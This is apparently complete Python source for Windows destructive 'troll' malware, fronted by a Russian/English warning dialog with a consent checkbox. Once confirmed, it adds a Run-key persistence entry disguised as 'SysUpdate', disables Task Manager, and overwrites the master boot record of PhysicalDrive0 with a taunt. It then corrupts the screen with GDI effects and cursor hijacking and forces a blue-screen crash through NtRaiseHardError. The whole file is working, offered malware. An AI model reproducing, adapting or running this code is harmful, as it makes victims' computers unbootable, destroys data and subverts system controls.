import customtkinter as ctk
import threading
import time
import ctypes
import random
import os
import winsound
import sys

u32 = ctypes.windll.user32
g32 = ctypes.windll.gdi32
nt = ctypes.windll.ntdll
k32 = ctypes.windll.kernel32

def no_exit(): pass

def overwrite_mbr():
    try:
        h = k32.CreateFileW("\\\\.\\PhysicalDrive0", 0x40000000, 0x01 | 0x02, None, 3, 0, None)
        if h != -1:
            d = bytearray(512)
            m = b"HAHAHA.YOUR BIN TROLL"
            d[:len(m)] = m
            d[510:512] = b"\x55\xAA"
            w = ctypes.c_ulong()
            k32.WriteFile(h, (ctypes.c_char * 512).from_buffer(d), 512, ctypes.byref(w), None)
            k32.CloseHandle(h)
    except: pass

def run_payload():
    if not v.get(): return
    root.withdraw()
    try:
        p = os.path.abspath(sys.argv[0])
        os.system(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SysUpdate" /t REG_SZ /d "{p}" /f')
        os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f')
    except: pass
    overwrite_mbr()
    h = u32.GetDC(0)
    sw, sh = u32.GetSystemMetrics(0), u32.GetSystemMetrics(1)
    t_msg = "Goodbye pc! PrizrakGPI by Mopzurk05"
    s_t = time.time()
    l_i = s_t
    while time.time() - s_t < 105:
        c_t = time.time()
        g32.BitBlt(h, random.randint(-10, 10), random.randint(-10, 10), sw, sh, h, 0, 0, 0x999999)
        if c_t - l_i > 10:
            g32.BitBlt(h, 0, 0, sw, sh, h, 0, 0, 0x5A0049)
            l_i = c_t
        g32.SetTextColor(h, random.randint(0, 0xFFFFFF))
        g32.SetBkMode(h, 1)
        g32.TextOutW(h, random.randint(0, sw), random.randint(0, sh), t_msg, len(t_msg))
        u32.DrawIcon(h, random.randint(0, sw), random.randint(0, sh), u32.LoadIconW(0, 32513))
        u32.SetCursorPos(random.randint(0, sw), random.randint(0, sh))
        if random.random() > 0.8:
            winsound.Beep(random.randint(400, 1200), 70)
            g32.StretchBlt(h, 20, 20, sw-40, sh-40, h, 0, 0, sw, sh, 0xCC0020)
        time.sleep(0.04)
    try:
        a1, a2 = ctypes.c_bool(), ctypes.c_ulong()
        nt.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(a1))
        nt.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(a2))
    except: os._exit(0)

def set_ru():
    lbl.configure(text="СИСТЕМНОЕ УВЕДОМЛЕНИЕ\n\nПрограмма повредит компьютер.\nВы подтверждаете запуск?")
    chk.configure(text="Я принимаю все риски")
    btn_y.configure(text="Да")
    btn_n.configure(text="Отмена")

def set_en():
    lbl.configure(text="SYSTEM NOTIFICATION\n\nThis will harm your computer.\nDo you confirm execution?")
    chk.configure(text="I accept all risks")
    btn_y.configure(text="Yes")
    btn_n.configure(text="Cancel")

root = ctk.CTk()
root.overrideredirect(True)
ww, wh = 450, 300
sw, sh = root.winfo_screenwidth(), root.winfo_screenheight()
root.geometry(f"{ww}x{wh}+{int(sw/2-ww/2)}+{int(sh/2-wh/2)}")
root.attributes("-topmost", True)

v = ctk.BooleanVar()
lbl = ctk.CTkLabel(root, text="", font=("Arial", 14, "bold"))
lbl.pack(pady=30)
chk = ctk.CTkCheckBox(root, text="", variable=v)
chk.pack()

f_btns = ctk.CTkFrame(root, fg_color="transparent")
f_btns.pack(pady=20)
btn_y = ctk.CTkButton(f_btns, text="", fg_color="#d32f2f", hover_color="#b71c1c", width=120, command=lambda: threading.Thread(target=run_payload).start())
btn_y.pack(side="left", padx=10)
btn_n = ctk.CTkButton(f_btns, text="", width=120, command=root.destroy)
btn_n.pack(side="left", padx=10)

f_lang = ctk.CTkFrame(root, fg_color="transparent")
f_lang.pack(side="bottom", pady=10)
ctk.CTkButton(f_lang, text="RU", width=40, command=set_ru).pack(side="left", padx=5)
ctk.CTkButton(f_lang, text="EN", width=40, command=set_en).pack(side="left", padx=5)

set_ru()
root.mainloop()
